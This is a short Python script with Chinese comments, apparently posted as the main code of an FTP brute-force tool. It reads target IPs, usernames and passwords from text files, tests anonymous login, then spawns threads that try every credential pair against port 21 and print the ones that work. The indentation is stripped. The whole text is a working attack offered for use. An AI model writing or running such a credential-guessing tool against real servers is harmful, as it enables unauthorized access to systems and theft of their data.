主要代码

from threading import Thread
import ftplib, socket
import sys, time, re
import _thread
'''
一、引入IP、域名、用户名及密码列表
二、定义FTP爆破函数
三、多线程for循环调用爆破函数
'''
IP_list=open('ip.txt').readlines()
Name_list=open('name.txt').readlines()
Pass_list=open('pass.txt').readlines()

def FTPPoJie(ip):
try:
print("匿名登录测试")
ftp=ftplib.FTP()
ftp.connect(ip,21,timeout=45)
ftp.login()
ftp.quit()
print("匿名登录成功")
return
except ftplib.all_errors:
print("匿名登录失败")

def FTPbrute(ip,name,passwd):
try:
ftp=ftplib.FTP()
print('ip:%s\n用户名：%s\n密码：%s\n'%(ip,name,passwd))
ftp.connect(ip,21,timeout=45)
ftp.login(name.rstrip(),passwd.rstrip())
ftp.quit()
print("\n\n用户名为：%s\n密码为：%s"%(name.rstrip(),passwd.rstrip()))
except ftplib.all_errors:
return
if __name__=="__main__":
for ip in IP_list:
FTPPoJie(ip.rstrip())
for name in Name_list:
for passwd in Pass_list:
try:
_thread.start_new_thread(FTPbrute,(ip,name.rstrip(),passwd.rstrip(),))#txt文件逐行读会读到 \n，使用restrip()去除字符串后面的空格
time.sleep(2)
except:
print("无法启动线程")
time.sleep(50)#给未执行完成的线程留点时间
